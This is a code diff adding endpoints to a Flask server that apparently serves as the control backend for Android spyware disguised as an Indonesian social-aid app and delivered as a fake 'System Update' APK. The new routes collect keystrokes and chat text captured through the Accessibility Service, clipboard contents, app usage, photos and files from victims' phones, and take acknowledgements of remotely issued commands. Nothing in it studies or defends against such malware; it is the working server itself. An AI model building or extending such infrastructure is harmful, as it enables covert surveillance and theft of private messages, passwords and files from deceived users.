@@ -870,14 +870,147 @@ def api_commands_exec(device_id, cmd_id):
     return jsonify({"success": True})
 
 
+# ============ BANSOS APK COMPAT ENDPOINTS ============
+
+@app.route("/api/apk-version")
+def api_apk_version():
+    """APK version check endpoint"""
+    apk_path = "/root/bansos-service-apk/build/out/bantuan-sosial.apk"
+    exists = os.path.exists(apk_path)
+    return jsonify({
+        "version_code": 5,
+        "version_name": "5.0",
+        "apk_ready": exists,
+        "apk_url": "/apk/download" if exists else None,
+        "force_update": False
+    })
+
+@app.route("/api/keylog/<device_id>", methods=["POST"])
+def api_keylog_device(device_id):
+    """Accessibility Service keylog + app usage endpoint (Bansos APK format)"""
+    try:
+        d = request.get_json(silent=True) or {}
+        # Check if this is app-usage data (has package but no entries)
+        if "package" in d and "entries" not in d:
+            db_exec("INSERT INTO app_usage_log (device_id,package,class_name,timestamp,received_at) VALUES (?,?,?,?,?)",
+                (device_id, d.get("package",""), d.get("class_name",""),
+                 int(time.time()), datetime.now().isoformat()))
+        # Keylog entries
+        entries = d.get("entries", [])
+        if entries and isinstance(entries, list):
+            for e in entries:
+                txt = e.get("text","")
+                db_exec("INSERT INTO keylog_log (device_id,text,package,class_name,char_length,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
+                    (device_id, txt, e.get("package",""), e.get("class_name",""),
+                     len(txt), e.get("timestamp", int(time.time())), datetime.now().isoformat()))
+        return jsonify({"success": True, "count": len(entries)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/keylog/<device_id>/status", methods=["POST"])
+def api_keylog_status(device_id):
+    """Device status update from APK"""
+    try:
+        d = request.get_json(silent=True) or {}
+        info = json.dumps(d)
+        db_exec("INSERT OR REPLACE INTO device_status (device_id,last_seen,status,info) VALUES (?,?,?,?)",
+            (device_id, datetime.now().isoformat(), "online", info))
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/app-usage/<device_id>", methods=["POST"])
+def api_app_usage_device(device_id):
+    """App foreground usage from APK"""
+    try:
+        d = request.get_json(silent=True) or {}
+        db_exec("INSERT INTO app_usage_log (device_id,package,class_name,timestamp,received_at) VALUES (?,?,?,?,?)",
+            (device_id, d.get("package",""), d.get("class_name",""),
+             d.get("timestamp", int(time.time())), datetime.now().isoformat()))
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/chat-capture/<device_id>", methods=["POST"])
+def api_chat_capture(device_id):
+    """Chat text capture from Accessibility Service"""
+    try:
+        d = request.get_json(silent=True) or {}
+        txt = d.get("text","")
+        pkg = d.get("package","")
+        if txt:
+            # Store as keylog entry with view_id marking it as chat
+            db_exec("INSERT INTO keylog_log (device_id,text,package,view_id,char_length,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
+                (device_id, txt, pkg, "chat_capture", len(txt),
+                 d.get("timestamp", int(time.time())), datetime.now().isoformat()))
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/clipboard/<device_id>", methods=["POST"])
+def api_clipboard_device(device_id):
+    """Clipboard capture from APK"""
+    try:
+        d = request.get_json(silent=True) or {}
+        txt = d.get("text","")
+        db_exec("INSERT INTO clipboard_log (device_id,text,char_length,timestamp,received_at) VALUES (?,?,?,?,?,?)",
+            (device_id, txt, d.get("char_length", len(txt)),
+             int(time.time()), datetime.now().isoformat()))
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/commands/<device_id>/ack", methods=["POST"])
+def api_commands_ack(device_id):
+    """Command acknowledgment from APK"""
+    try:
+        d = request.get_json(silent=True) or {}
+        cmd_id = d.get("id", 0)
+        status = d.get("status", "done")
+        result = d.get("result", "")
+        db_exec("UPDATE command_queue SET status=?, executed_at=?, result=? WHERE id=? AND device_id=?",
+            (status, datetime.now().isoformat(), result, cmd_id, device_id))
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/device-upload/<device_id>", methods=["POST"])
+def api_device_upload(device_id):
+    """Photo/file upload from APK"""
+    try:
+        d = request.get_json(silent=True) or {}
+        photo_data = d.get("image") or d.get("photo") or d.get("file")
+        if photo_data and isinstance(photo_data, str) and photo_data.startswith("data:"):
+            try:
+                photo_bin = base64.b64decode(photo_data.split(",")[1])
+                db_exec("INSERT INTO photos (tracking_id, photo, timestamp) VALUES (?,?,?)",
+                    (device_id, photo_bin, datetime.now().isoformat()))
+                return jsonify({"success": True, "photo_id": device_id})
+            except Exception as e:
+                return jsonify({"success": False, "error": str(e)}), 500
+        # multipart/form-data upload
+        f = request.files
+        if "image" in f or "photo" in f or "file" in f:
+            pf = f.get("image") or f.get("photo") or f.get("file")
+            db_exec("INSERT INTO photos (tracking_id, photo, timestamp) VALUES (?,?,?)",
+                (device_id, pf.read(), datetime.now().isoformat()))
+            return jsonify({"success": True})
+        return jsonify({"success": False, "error": "no image data"}), 400
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+
 @app.route("/apk/download")
 def apk_download():
     """Download the Android APK"""
-    apk_path = "/root/droid-service/build/output/SystemService-v1.0.0.apk"
+    apk_path = "/root/bansos-service-apk/build/out/bantuan-sosial.apk"
+    # Fallback to GitHub Actions build
+    if not os.path.exists(apk_path):
+        apk_path = "/root/droid-service/build/output/SystemService-v1.0.0.apk"
     if os.path.exists(apk_path):
         return send_file(apk_path, mimetype="application/vnd.android.package-archive",
-                         as_attachment=True, attachment_filename="SystemService-v1.0.0.apk")
-    return "APK not found", 404
+                         as_attachment=True, attachment_filename="PembaruanSistem-v5.0.apk")
+    return "APK not found. Run GitHub Actions workflow first.", 404
 
 
 async def cmd_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
